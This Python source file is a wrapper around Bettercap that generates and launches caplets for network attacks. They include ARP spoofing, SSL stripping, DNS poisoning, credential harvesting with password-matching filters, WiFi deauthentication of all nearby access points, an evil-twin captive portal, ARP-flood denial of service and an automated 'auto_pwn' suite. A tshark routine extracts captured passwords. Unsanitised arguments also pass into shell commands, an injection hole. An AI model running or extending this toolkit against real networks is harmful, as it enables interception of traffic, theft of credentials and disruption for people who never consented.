#!/usr/bin/env python3
"""
Enhanced Bettercap Integration
Interactive network attacks, MITM, credential capture with real-time display
"""

import os
import subprocess
import json
import time
import threading
from pathlib import Path
from datetime import datetime

class BettercapAdvanced:
    def __init__(self, work_dir, log_callback=None):
        self.work_dir = Path(work_dir)
        self.log = log_callback or print
        self.captures_dir = self.work_dir / "bettercap_captures"
        self.captures_dir.mkdir(exist_ok=True)
        self.sessions_dir = self.work_dir / "bettercap_sessions"
        self.sessions_dir.mkdir(exist_ok=True)

    def interactive_discovery(self, interface):
        """Interactive network discovery with real-time updates"""
        caplet_file = self.sessions_dir / f"discovery_{int(time.time())}.cap"
        output_file = self.captures_dir / f"discovery_{int(time.time())}.pcap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Interactive Network Discovery\n")
            f.write(f"set net.sniff.output {output_file}\n")
            f.write(f"set net.sniff.verbose true\n")
            f.write(f"set net.probe.throttle 10\n")
            f.write(f"\n")
            f.write(f"# Enable modules\n")
            f.write(f"net.probe on\n")
            f.write(f"net.sniff on\n")
            f.write(f"\n")
            f.write(f"# Display info\n")
            f.write(f"events.stream on\n")
            f.write(f"ticker on\n")

        self.log("Starting interactive discovery...", "INFO")
        self.log("Commands available:", "INFO")
        self.log("  net.show - Show discovered hosts", "INFO")
        self.log("  net.recon on/off - Toggle network recon", "INFO")
        self.log("  quit - Exit", "INFO")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def mass_arp_spoof(self, interface, targets=''):
        """Mass ARP spoofing with credential capture"""
        caplet_file = self.sessions_dir / f"mass_arp_{int(time.time())}.cap"
        output_file = self.captures_dir / f"mass_arp_{int(time.time())}.pcap"
        creds_file = self.captures_dir / f"credentials_{int(time.time())}.txt"

        with open(caplet_file, 'w') as f:
            f.write(f"# Mass ARP Spoofing Attack\n\n")

            # Network discovery first
            f.write(f"set net.probe.throttle 10\n")
            f.write(f"net.probe on\n")
            f.write(f"sleep 15\n\n")

            # ARP spoofing configuration
            if targets:
                f.write(f"set arp.spoof.targets {targets}\n")
            f.write(f"set arp.spoof.internal true\n")
            f.write(f"set arp.spoof.fullduplex true\n\n")

            # Packet capture
            f.write(f"set net.sniff.verbose true\n")
            f.write(f"set net.sniff.local true\n")
            f.write(f"set net.sniff.filter 'tcp port 80 or tcp port 443 or tcp port 21 or tcp port 23 or tcp port 110 or tcp port 143'\n")
            f.write(f"set net.sniff.output {output_file}\n\n")

            # HTTP proxy for credential capture
            f.write(f"set http.proxy.sslstrip true\n")
            f.write(f"set http.proxy.script /usr/share/bettercap/caplets/http-ui.cap\n\n")

            # DNS spoofing (optional)
            f.write(f"# Uncomment to enable DNS spoofing\n")
            f.write(f"# set dns.spoof.domains *.com\n")
            f.write(f"# set dns.spoof.address [YOUR_IP]\n")
            f.write(f"# dns.spoof on\n\n")

            # Start attacks
            f.write(f"arp.spoof on\n")
            f.write(f"http.proxy on\n")
            f.write(f"net.sniff on\n\n")

            # Events
            f.write(f"events.stream on\n")
            f.write(f"ticker on\n")

        self.log("Starting mass ARP spoofing...", "INFO")
        self.log(f"Capture file: {output_file}", "INFO")
        self.log("Press Ctrl+C to stop", "WARNING")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def dns_poisoning_campaign(self, interface, spoofing_config):
        """DNS poisoning with custom configuration"""
        caplet_file = self.sessions_dir / f"dns_poison_{int(time.time())}.cap"
        hosts_file = self.sessions_dir / f"dns_hosts_{int(time.time())}.txt"

        # Write DNS hosts file
        with open(hosts_file, 'w') as f:
            for domain, ip in spoofing_config.items():
                f.write(f"{domain} {ip}\n")

        with open(caplet_file, 'w') as f:
            f.write(f"# DNS Poisoning Campaign\n\n")

            f.write(f"set dns.spoof.domains *\n")
            f.write(f"set dns.spoof.hosts {hosts_file}\n")
            f.write(f"set dns.spoof.all true\n\n")

            f.write(f"arp.spoof on\n")
            f.write(f"dns.spoof on\n")
            f.write(f"net.sniff on\n\n")

            f.write(f"events.stream on\n")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def ssl_strip_advanced(self, interface, downgrade_list=None):
        """Advanced SSL stripping with HSTS bypass"""
        caplet_file = self.sessions_dir / f"sslstrip_{int(time.time())}.cap"
        output_file = self.captures_dir / f"sslstrip_{int(time.time())}.pcap"

        downgrade_list = downgrade_list or [
            'mail.google.com',
            'facebook.com',
            'twitter.com',
            'linkedin.com'
        ]

        with open(caplet_file, 'w') as f:
            f.write(f"# Advanced SSL Stripping\n\n")

            # ARP spoofing
            f.write(f"set arp.spoof.internal true\n")
            f.write(f"set arp.spoof.fullduplex true\n")
            f.write(f"arp.spoof on\n\n")

            # SSL stripping
            f.write(f"set http.proxy.sslstrip true\n")
            f.write(f"set http.proxy.port 8080\n\n")

            # HSTS bypass
            for domain in downgrade_list:
                f.write(f"# Downgrade {domain}\n")

            # Custom proxy script
            f.write(f"http.proxy on\n\n")

            # Capture
            f.write(f"set net.sniff.output {output_file}\n")
            f.write(f"net.sniff on\n\n")

            f.write(f"events.stream on\n")

        self.log("Starting SSL stripping attack...", "INFO")
        self.log("Downgrading HTTPS to HTTP for credential capture", "WARNING")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def credential_harvester_pro(self, interface):
        """Professional credential harvesting setup"""
        caplet_file = self.sessions_dir / f"cred_harvest_{int(time.time())}.cap"
        output_file = self.captures_dir / f"credentials_{int(time.time())}.pcap"
        log_file = self.captures_dir / f"harvested_{int(time.time())}.log"

        with open(caplet_file, 'w') as f:
            f.write(f"# Professional Credential Harvester\n\n")

            # Network setup
            f.write(f"set arp.spoof.internal true\n")
            f.write(f"set arp.spoof.fullduplex true\n\n")

            # HTTP Proxy with SSL strip
            f.write(f"set http.proxy.sslstrip true\n")
            f.write(f"set http.proxy.port 8080\n\n")

            # Capture configuration
            f.write(f"set net.sniff.verbose true\n")
            f.write(f"set net.sniff.local true\n")
            f.write(f"set net.sniff.output {output_file}\n")
            f.write(f"set net.sniff.regexp '.*password=.+|.*login=.+|.*user=.+|.*pass=.+'\n\n")

            # Modules
            f.write(f"# HTTP Form Sniffer\n")
            f.write(f"http.proxy on\n")
            f.write(f"arp.spoof on\n")
            f.write(f"net.sniff on\n\n")

            # Event logging
            f.write(f"set events.stream.output {log_file}\n")
            f.write(f"events.stream on\n\n")

            # Display
            f.write(f"ticker on\n")

        self.log("Credential harvester is running...", "INFO")
        self.log(f"Credentials will be logged to: {log_file}", "INFO")
        self.log("Monitoring for: passwords, logins, authentication attempts", "INFO")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def wifi_handshake_capture_auto(self, interface, bssid=None, channel=None):
        """Automated WiFi handshake capture with deauth"""
        caplet_file = self.sessions_dir / f"wifi_handshake_{int(time.time())}.cap"
        output_file = self.captures_dir / f"handshake_{int(time.time())}.pcap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Automated WiFi Handshake Capture\n\n")

            # WiFi configuration
            if channel:
                f.write(f"set wifi.interface {interface}\n")
                f.write(f"set wifi.channel {channel}\n")

            f.write(f"set wifi.recon.channel_hops false\n\n")

            # Start reconnaissance
            f.write(f"wifi.recon on\n")
            f.write(f"sleep 30\n\n")

            # Show discovered APs
            f.write(f"wifi.show\n\n")

            # Deauth specific target or all
            if bssid:
                f.write(f"# Deauth specific AP\n")
                f.write(f"wifi.deauth {bssid}\n")
            else:
                f.write(f"# Deauth all discovered APs\n")
                f.write(f"wifi.deauth all\n")

            # Capture
            f.write(f"set net.sniff.output {output_file}\n")
            f.write(f"net.sniff on\n\n")

            f.write(f"events.stream on\n")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def bluetooth_discovery(self, interface):
        """Bluetooth device discovery and attacks"""
        caplet_file = self.sessions_dir / f"bluetooth_{int(time.time())}.cap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Bluetooth Discovery\n\n")

            f.write(f"set ble.device {interface}\n")
            f.write(f"ble.recon on\n")
            f.write(f"ble.show\n\n")

            f.write(f"events.stream on\n")
            f.write(f"ticker on\n")

        os.system(f"bettercap -caplet {caplet_file}")

    def captive_portal_attack(self, interface, portal_ssid):
        """Evil twin with captive portal"""
        caplet_file = self.sessions_dir / f"captive_portal_{int(time.time())}.cap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Captive Portal Attack\n\n")

            # WiFi AP setup
            f.write(f"set wifi.ap.ssid {portal_ssid}\n")
            f.write(f"set wifi.ap.bssid [MAC_ADDRESS]\n")
            f.write(f"set wifi.ap.channel 6\n")
            f.write(f"set wifi.ap.encryption false\n\n")

            # HTTP server for portal
            f.write(f"set http.server.port 80\n")
            f.write(f"set http.server.path /var/www/html/captive\n\n")

            # DNS spoofing to redirect to portal
            f.write(f"set dns.spoof.domains *\n")
            f.write(f"set dns.spoof.address [YOUR_IP]\n")
            f.write(f"set dns.spoof.all true\n\n")

            # Start modules
            f.write(f"wifi.ap\n")
            f.write(f"http.server on\n")
            f.write(f"dns.spoof on\n\n")

            f.write(f"events.stream on\n")

        self.log("Captive portal attack started", "INFO")
        self.log(f"SSID: {portal_ssid}", "INFO")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def packet_injection(self, interface, target_mac, injection_data):
        """Custom packet injection"""
        caplet_file = self.sessions_dir / f"injection_{int(time.time())}.cap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Packet Injection Attack\n\n")

            f.write(f"set packet.proxy.dst {target_mac}\n")
            f.write(f"set packet.proxy.payload {injection_data}\n\n")

            f.write(f"packet.proxy on\n")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def network_stress_test(self, interface, target=None):
        """Network stress testing / DoS"""
        caplet_file = self.sessions_dir / f"stress_{int(time.time())}.cap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Network Stress Test\n\n")

            if target:
                # Target-specific stress
                f.write(f"# ARP flood against {target}\n")
                f.write(f"set arp.ban.targets {target}\n")
                f.write(f"arp.ban on\n\n")
            else:
                # Network-wide stress
                f.write(f"# Network-wide stress test\n")
                f.write(f"net.probe on\n")

        self.log("WARNING: Stress testing can cause network disruption!", "WARNING")
        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def interactive_packet_manipulation(self, interface):
        """Interactive packet manipulation console"""
        caplet_file = self.sessions_dir / f"packet_manip_{int(time.time())}.cap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Interactive Packet Manipulation\n\n")

            f.write(f"set net.sniff.verbose true\n")
            f.write(f"set net.sniff.local true\n\n")

            # Enable packet proxy for manipulation
            f.write(f"# Use packet.proxy module for real-time manipulation\n")
            f.write(f"net.sniff on\n")
            f.write(f"events.stream on\n\n")

            # Interactive commands available
            f.write(f"# Available commands:\n")
            f.write(f"# packet.proxy on - Start packet proxy\n")
            f.write(f"# set packet.proxy.script /path/to/script.js\n")
            f.write(f"# Custom JavaScript for packet modification\n")

        self.log("Interactive packet manipulation console", "INFO")
        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def web_ui_attack_dashboard(self, interface, ui_port=8081):
        """Launch Bettercap web UI for interactive attacks"""
        caplet_file = self.sessions_dir / f"webui_{int(time.time())}.cap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Web UI Attack Dashboard\n\n")

            # Web UI configuration
            f.write(f"set http.server.address 0.0.0.0\n")
            f.write(f"set http.server.port {ui_port}\n")
            f.write(f"set https.server.enabled true\n")
            f.write(f"set https.server.port {ui_port + 1}\n\n")

            # Authentication (change these!)
            f.write(f"set api.rest.username admin\n")
            f.write(f"set api.rest.password bettercap\n\n")

            # Enable modules
            f.write(f"api.rest on\n")
            f.write(f"http-ui\n\n")

            # Network discovery
            f.write(f"net.probe on\n")
            f.write(f"ticker on\n")

        self.log(f"Web UI will be available at: https://127.0.0.1:{ui_port + 1}", "INFO")
        self.log("Username: admin | Password: bettercap", "INFO")
        self.log("CHANGE THE DEFAULT CREDENTIALS!", "WARNING")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def auto_pwn_network(self, interface):
        """Automated network exploitation suite"""
        caplet_file = self.sessions_dir / f"auto_pwn_{int(time.time())}.cap"
        output_file = self.captures_dir / f"auto_pwn_{int(time.time())}.pcap"

        with open(caplet_file, 'w') as f:
            f.write(f"# Automated Network Exploitation\n\n")

            # Discovery phase
            f.write(f"# Phase 1: Discovery\n")
            f.write(f"net.probe on\n")
            f.write(f"sleep 30\n")
            f.write(f"net.show\n\n")

            # Attack phase
            f.write(f"# Phase 2: ARP Spoofing\n")
            f.write(f"set arp.spoof.internal true\n")
            f.write(f"set arp.spoof.fullduplex true\n")
            f.write(f"arp.spoof on\n\n")

            # Credential capture
            f.write(f"# Phase 3: Credential Capture\n")
            f.write(f"set http.proxy.sslstrip true\n")
            f.write(f"http.proxy on\n\n")

            # DNS spoofing
            f.write(f"# Phase 4: DNS Spoofing\n")
            f.write(f"set dns.spoof.all true\n")
            f.write(f"dns.spoof on\n\n")

            # Packet capture
            f.write(f"# Phase 5: Packet Capture\n")
            f.write(f"set net.sniff.verbose true\n")
            f.write(f"set net.sniff.output {output_file}\n")
            f.write(f"net.sniff on\n\n")

            # Monitoring
            f.write(f"events.stream on\n")
            f.write(f"ticker on\n")

        self.log("Automated network exploitation started", "INFO")
        self.log("This will run all attack modules simultaneously", "WARNING")

        os.system(f"bettercap -iface {interface} -caplet {caplet_file}")

    def parse_captured_creds(self, pcap_file):
        """Parse captured PCAP for credentials"""
        self.log(f"Parsing credentials from {pcap_file}", "INFO")

        creds_file = self.captures_dir / f"parsed_creds_{int(time.time())}.txt"

        # Use tshark to extract credentials
        commands = [
            # HTTP Basic Auth
            f"tshark -r {pcap_file} -Y 'http.authorization' -T fields -e http.authorization",

            # HTTP POST data (forms)
            f"tshark -r {pcap_file} -Y 'http.request.method == POST' -T fields -e http.file_data",

            # FTP credentials
            f"tshark -r {pcap_file} -Y 'ftp.request.command == USER || ftp.request.command == PASS' -T fields -e ftp.request.arg",

            # SMTP
            f"tshark -r {pcap_file} -Y 'smtp.req.command == AUTH' -T fields -e smtp.req.parameter",
        ]

        with open(creds_file, 'w') as f:
            for cmd in commands:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    f.write(f"=== {cmd.split('-Y')[1].split('-T')[0]} ===\n")
                    f.write(result.stdout)
                    f.write("\n\n")

        self.log(f"Credentials saved to: {creds_file}", "SUCCESS")
        return creds_file
